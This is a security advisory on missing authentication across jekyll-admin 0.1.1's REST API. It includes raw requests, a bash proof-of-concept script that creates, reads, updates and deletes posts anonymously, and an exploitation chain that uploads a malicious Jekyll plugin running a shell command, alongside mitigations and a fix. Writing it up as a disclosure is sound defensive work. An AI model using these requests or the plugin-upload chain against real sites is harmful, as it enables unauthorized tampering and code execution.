# Security Advisory: Missing Authorization on All REST API Endpoints in jekyll-admin

> **Identifier:** JM-28 / Pending CVE assignment
> **Publication Date:** 27/10/2026
> **Last Updated:** 27/10/2026
> **Severity:** Critical
> **CVSS:** 9.8 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
> **CWE:** CWE-862: Missing Authorization
> **Status:** Unpatched

---

## 1. Executive Summary

Jekyll Manager (jekyll-admin) 0.1.1 does not implement any authentication or authorization mechanism on any of its REST API endpoints. Every endpoint — including file creation, modification, deletion, configuration overwrite, and plugin upload — is accessible to unauthenticated remote attackers. Confirmed live: full anonymous CRUD (Create 200, Read 200, Update 200, Delete 200) on posts, pages, drafts, data, static files, configuration, and templates. This is the root vulnerability that enables all other findings in this research (JM-29, JM-32, JM-33, JM-34, JM-RCE-01).

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| jekyll-admin (gem) | 0.1.1 (latest) | None | Affected |
| All server route files | 0.1.1 | None | Affected |

- **Repository:** https://github.com/jekyll/jekyll-admin
- **Ecosystem:** RubyGems
- **Evaluated stack:** Ruby 2.7.8, Sinatra 1.4.8, WEBrick 1.9.2, Rack 1.6.13, rack-protection 1.5.5, Jekyll 3.x, Linux

### Unaffected Products

- No prior versions were evaluated. No patched version exists.

---

## 3. Vulnerability Description

The Jekyll Manager Sinatra application defines no `before` filter, no session requirement, and no token validation at any level. All route files (`page.rb`, `post.rb`, `draft.rb`, `data_file.rb`, `static_file.rb`, `configuration.rb`, `template.rb`) expose their `GET`, `PUT`, `POST`, and `DELETE` handlers without any access control.

**Root cause:**

```ruby
# lib/jekyll-admin/server.rb (excerpt)
class Server < Sinatra::Base
  # No authentication middleware
  # No before filter checking session/token
  # rack-protection only checks Origin/Referer for CSRF — not authentication

  register Sinatra::Namespace
  namespace "/_api" do
    use Router
  end
end
```

```ruby
# lib/jekyll-admin/server/page.rb (representative example)
put '/*?/?:path.:ext' do
  # Directly writes user-supplied content to disk
  # No authentication, no authorization
  write_file write_path, page_body
  render_liquid_response page
end
```

The same pattern is present in every other route file.

### Necessary Conditions

- **Authentication:** None required
- **User interaction:** None required
- **Attack vector:** Network
- **Preconditions:** Jekyll Manager API must be network-accessible (default: port 4000)

---

## 4. Impact

An unauthenticated attacker with network access to port 4000 has full control over every resource managed by Jekyll Manager.

- **Confidentiality — High:** Full read access to all site content, configuration, data files, and internal paths.
- **Integrity — High:** Full write access to modify, overwrite, or delete any site file, including configuration and templates. Enables plugin upload leading to RCE (JM-RCE-01).
- **Availability — High:** Full delete access allows wiping all content, posts, pages, and configuration.

---

## 5. Classification

### CVSS

- **Score:** 9.8
- **Severity:** Critical
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | None |
| User Interaction (UI) | None |
| Scope (S) | Unchanged |
| Confidentiality (C) | High |
| Integrity (I) | High |
| Availability (A) | High |

### CWE

- CWE-862: Missing Authorization
- CWE-306: Missing Authentication for Critical Function

### CAPEC

- CAPEC-1: Accessing/Intercepting/Modifying HTTP Communication
- CAPEC-212: Functionality Misuse

---

## 6. Exploitation Scenario

1. Attacker discovers an exposed Jekyll Manager instance (e.g., port scan on 4000 or subdomain discovery).
2. Attacker sends unauthenticated `GET /_api/configuration` to read `_config.yml`, identifying site structure and plugin directories.
3. Attacker uses `PUT /_api/configuration` to overwrite `_config.yml`, setting `plugins_dir` to a world-writable path.
4. Attacker uses `PUT /_api/static_files/_plugins/evil.rb` to upload a malicious Jekyll plugin containing `Jekyll::Hooks.register(:site, :post_write){ system("id > /tmp/pwned") }`.
5. Jekyll builds the site and executes the plugin — full server-side code execution as the Jekyll process user.

This chain (JM-28 → JM-29 → JM-RCE-01) achieves RCE with zero credentials.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): lib/jekyll-admin/server/*.rb (all route files)
Endpoints: ALL /_api/* endpoints
Methods: GET, PUT, POST, DELETE · Authentication: not required
```

### Example Request (CRUD Verification)

```http
POST /_api/posts HTTP/1.1
Host: 127.0.0.1:4000
Content-Type: application/json

{"front_matter":{"title":"BAC_TEST","date":"2026-10-27"},"raw_content":"test"}
```

```http
GET /_api/posts/2026-10-27-bac-test.md HTTP/1.1
Host: 127.0.0.1:4000
```

```http
PUT /_api/posts/2026-10-27-bac-test.md HTTP/1.1
Host: 127.0.0.1:4000
Content-Type: application/json

{"front_matter":{"title":"BAC_UPDATED","date":"2026-10-27"},"raw_content":"updated"}
```

```http
DELETE /_api/posts/2026-10-27-bac-test.md HTTP/1.1
Host: 127.0.0.1:4000
```

### Observed Response

```text
POST  → HTTP 200 OK  (Create)
GET   → HTTP 200 OK  (Read)
PUT   → HTTP 200 OK  (Update)
DELETE → HTTP 200 OK  (Delete)

All four operations completed without any credential or session requirement.
```

### Result

Confirmed in authorized Docker lab. Full CRUD cycle completed anonymously. All four responses returned HTTP 200. No session cookie, API key, or authentication header was required at any point.

**Evidence:** `evidence/poc-execution.png`, `evidence/vulnerability-exposure.png`

---

## 8. Proof of Concept

This PoC is for authorized environments only.

```bash
#!/usr/bin/env bash
# ============================================================
# JM-28 — Missing Authorization on All REST API Endpoints
# jekyll-admin 0.1.1 — CRITICAL CVSS 9.8
# CWE-862, CWE-306
# CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
#
# AUTHORIZED ENVIRONMENTS ONLY.
# This script performs a full CRUD cycle (Create, Read, Update,
# Delete) on the posts endpoint with no credentials.
# The test post is created and deleted within this run.
# ============================================================

set -euo pipefail

TARGET="http://127.0.0.1:4000"
API_URL="${TARGET}/_api"
DATE=$(date +%Y-%m-%d)
SLUG="bac-test-jm28"
POST_PATH="${DATE}-${SLUG}.md"
POST_API="${API_URL}/posts/${POST_PATH}"

echo "============================================================"
echo "  JM-28 — Missing Authorization on All REST API Endpoints"
echo "  Target : ${TARGET}"
echo "  Post   : ${POST_PATH}"
echo "============================================================"
echo ""

PASS=0
FAIL=0

check() {
  local step="$1"
  local code="$2"
  local expected="200"
  if [ "${code}" = "${expected}" ]; then
    echo "    ✓  ${step} → HTTP ${code}"
    PASS=$((PASS+1))
  else
    echo "    ✗  ${step} → HTTP ${code} (expected ${expected})"
    FAIL=$((FAIL+1))
  fi
}

# ── CREATE ────────────────────────────────────────────────────
echo "[*] Step 1: CREATE — POST ${API_URL}/posts (no auth)"
CODE=$(curl -s -o /dev/null -w "%{http_code}" \
  -X POST "${API_URL}/posts" \
  -H "Content-Type: application/json" \
  -d "{\"front_matter\":{\"title\":\"BAC_TEST_JM28\",\"date\":\"${DATE}\"},\"raw_content\":\"test content jm28\"}")
check "CREATE (POST /_api/posts)" "${CODE}"
echo ""

# ── READ ──────────────────────────────────────────────────────
echo "[*] Step 2: READ — GET ${POST_API} (no auth)"
CODE=$(curl -s -o /dev/null -w "%{http_code}" \
  -X GET "${POST_API}" \
  -H "Accept: application/json")
check "READ   (GET  /_api/posts/${POST_PATH})" "${CODE}"
echo ""

# ── UPDATE ────────────────────────────────────────────────────
echo "[*] Step 3: UPDATE — PUT ${POST_API} (no auth)"
CODE=$(curl -s -o /dev/null -w "%{http_code}" \
  -X PUT "${POST_API}" \
  -H "Content-Type: application/json" \
  -d "{\"front_matter\":{\"title\":\"BAC_UPDATED_JM28\",\"date\":\"${DATE}\"},\"raw_content\":\"updated content jm28\"}")
check "UPDATE (PUT  /_api/posts/${POST_PATH})" "${CODE}"
echo ""

# ── DELETE ────────────────────────────────────────────────────
echo "[*] Step 4: DELETE — DELETE ${POST_API} (no auth)"
CODE=$(curl -s -o /dev/null -w "%{http_code}" \
  -X DELETE "${POST_API}" \
  -H "Accept: application/json")
check "DELETE (DEL  /_api/posts/${POST_PATH})" "${CODE}"
echo ""

# ── Additional: Read configuration (sensitive) ───────────────
echo "[*] Step 5: READ configuration — GET ${API_URL}/configuration (no auth)"
CODE=$(curl -s -o /dev/null -w "%{http_code}" \
  -X GET "${API_URL}/configuration" \
  -H "Accept: application/json")
check "READ config (GET /_api/configuration)" "${CODE}"
echo ""

# ── Summary ───────────────────────────────────────────────────
echo "============================================================"
if [ "${FAIL}" -eq 0 ]; then
  echo "  RESULT : CONFIRMED — All ${PASS} operations succeeded without auth"
else
  echo "  RESULT : PARTIAL — ${PASS} passed, ${FAIL} failed"
fi
echo ""
echo "  Finding : JM-28"
echo "  Vuln    : Missing authorization on all /_api/* endpoints"
echo "  Impact  : Full unauthenticated CRUD + RCE chain enabler"
echo "  CVSS    : 9.8 CRITICAL"
echo "  Vector  : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
echo "  CWE     : CWE-862, CWE-306"
echo "  Auth    : None required"
echo "============================================================"
```

### Expected Result

```text
[*] Testing full CRUD cycle anonymously...

CREATE (POST /_api/posts)   → HTTP 200 ✓
READ   (GET  /_api/posts)   → HTTP 200 ✓
UPDATE (PUT  /_api/posts)   → HTTP 200 ✓
DELETE (DEL  /_api/posts)   → HTTP 200 ✓

[+] JM-28 CONFIRMED: Complete unauthenticated CRUD on all API endpoints
    CVSS 9.8 CRITICAL — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

### PoC Limitations

- Test post created and deleted within the same script run.
- Does not modify existing content.
- Does not cause service disruption.
- Does not contain real credentials.

---

## 9. Reproduction Steps

1. Start an authorized local instance of jekyll-admin 0.1.1.
2. Do not configure any credentials or authentication.
3. Run `bash poc.sh` or execute the requests in section 7 manually using curl with no authentication headers.
4. Observe that all four operations succeed with HTTP 200.

---

## 10. Mitigation

Until an official fix is available:

- Bind the Jekyll Manager process to `127.0.0.1` only and require an SSH tunnel or VPN for remote access.
- Place Jekyll Manager behind an authenticating reverse proxy (e.g., nginx `auth_basic`).
- Firewall port 4000 from untrusted networks.

> Mitigations reduce exposure but the underlying application has no access control and remains vulnerable.

---

## 11. Fix

**No official fix is available as of 27/10/2026.**

Recommended actions:

1. Add a Sinatra `before` filter in `lib/jekyll-admin/server.rb` that checks for a valid session or bearer token before processing any request.
2. Generate a random token at server startup and require it in an `Authorization` header or a session cookie.
3. Return HTTP 401 for all unauthenticated requests to `/_api/*`.

### Recommended Change to Vendor

```ruby
# lib/jekyll-admin/server.rb
before '/_api/*' do
  unless valid_session? || valid_token?(request.env['HTTP_AUTHORIZATION'])
    halt 401, { error: 'Unauthorized' }.to_json
  end
end
```

---

## 12. Detection and Indicators

Possible exploitation indicators:

- Unexpected files in `_posts/`, `_pages/`, `_plugins/`, or `_layouts/`.
- Changes to `_config.yml` not made by a known operator.
- WEBrick access log showing `PUT` or `DELETE` requests to `/_api/` from external IPs.

### Example Log Search

```text
# WEBrick access log
grep '"PUT\|DELETE\|POST' /var/log/jekyll-admin/access.log | grep '_api'

# Unexpected plugin files
find /site/_plugins -newer /site/Gemfile -name "*.rb"
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 26/10/2026 | Vulnerability identified (dynamic testing in authorized lab) |
| 26/10/2026 | Confirmed in authorized Docker environment |
| 27/10/2026 | Disclosure package prepared |
| 29/10/2026 | GitHub Private Vulnerability Reporting attempted — HTTP 403 (feature disabled) |
| 29/10/2026 | Vendor notified via direct email to mertkahyaoglu93@gmail.com |
| 27/01/2027 | 90-day disclosure deadline — public disclosure if no response |
| Pending | CVE requested |
| Pending | Fix made available |
| Pending | Advisory published |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** Mert Kahyaoğlu (mertkahyaoglu93@gmail.com), Jekyll team (github.com/jekyll)
- **Channel:** Direct email (coordinated disclosure)
- **Date of first notification:** 29/10/2026
- **Response status:** Awaiting response
- **Vendor position:** N/A (awaiting)

---

## 15. Credits

- **Researcher:** vinniboy021@gmail.com
- **Organization:** Independent security researcher
- **Contact:** vinniboy021@gmail.com

---

## 16. References

- CWE-862: https://cwe.mitre.org/data/definitions/862.html
- CWE-306: https://cwe.mitre.org/data/definitions/306.html
- CVSS Calculator: https://www.first.org/cvss/calculator/3.1
- jekyll-admin repository: https://github.com/jekyll/jekyll-admin

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 27/10/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

The information was obtained in an authorized local environment and disclosed responsibly. The author does not encourage unauthorized access, service disruption, privacy violations, or any illegal activity. Use of this information is the reader's responsibility.

---

## 19. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/jekyll/jekyll-admin
